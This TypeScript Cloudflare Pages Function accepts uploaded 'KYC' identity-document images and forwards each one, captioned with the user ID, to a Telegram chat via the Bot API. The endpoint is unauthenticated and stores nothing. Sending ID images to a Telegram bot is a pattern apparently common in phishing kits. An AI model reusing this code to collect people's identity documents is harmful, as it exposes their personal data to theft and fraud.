interface Env {
  TELEGRAM_BOT_TOKEN: string;
  TELEGRAM_CHAT_ID: string;
}

interface KycRequest {
  userId: string;
  images: { name: string; data: string }[];
}

async function sendToTelegram(
  token: string,
  chatId: string,
  caption: string,
  imageBase64: string,
  fileName: string
): Promise<{ ok: boolean; error?: string }> {
  const boundary = "----FormBoundary" + crypto.randomUUID().replace(/-/g, "");
  const crlf = "\r\n";
  const encoder = new TextEncoder();

  const parts: Uint8Array[] = [];

  parts.push(
    encoder.encode(
      `--${boundary}${crlf}Content-Disposition: form-data; name="chat_id"${crlf}${crlf}${chatId}${crlf}`
    )
  );
  parts.push(
    encoder.encode(
      `--${boundary}${crlf}Content-Disposition: form-data; name="caption"${crlf}${crlf}${caption}${crlf}`
    )
  );

  const binary = atob(imageBase64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }

  parts.push(
    encoder.encode(
      `--${boundary}${crlf}Content-Disposition: form-data; name="photo"; filename="${fileName}"${crlf}Content-Type: image/png${crlf}${crlf}`
    )
  );
  parts.push(bytes);
  parts.push(encoder.encode(`${crlf}--${boundary}--${crlf}`));

  let totalLength = 0;
  for (const part of parts) totalLength += part.length;

  const body = new Uint8Array(totalLength);
  let offset = 0;
  for (const part of parts) {
    body.set(part, offset);
    offset += part.length;
  }

  const res = await fetch(
    `https://api.telegram.org/bot${token}/sendPhoto`,
    {
      method: "POST",
      headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
      body,
    }
  );

  if (!res.ok) {
    const text = await res.text();
    return { ok: false, error: text };
  }
  return { ok: true };
}

export const onRequestPost: PagesFunction<Env> = async (context) => {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = context.env;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return new Response(
      JSON.stringify({ error: "Telegram not configured" }),
      { status: 500, headers: { "Content-Type": "application/json" } }
    );
  }

  try {
    const body = (await context.request.json()) as KycRequest;

    if (!body.userId || !body.images?.length) {
      return new Response(
        JSON.stringify({ error: "Missing userId or images" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }

    const results: { ok: boolean; name: string; error?: string }[] = [];
    for (const image of body.images) {
      const result = await sendToTelegram(
        TELEGRAM_BOT_TOKEN,
        TELEGRAM_CHAT_ID,
        `KYC Document — User: ${body.userId} — File: ${image.name}`,
        image.data,
        image.name
      );
      results.push({ ...result, name: image.name });
    }

    const allOk = results.every((r) => r.ok);
    return new Response(
      JSON.stringify({ success: allOk, results }),
      {
        status: allOk ? 200 : 502,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch {
    return new Response(
      JSON.stringify({ error: "Invalid request" }),
      { status: 400, headers: { "Content-Type": "application/json" } }
    );
  }
};
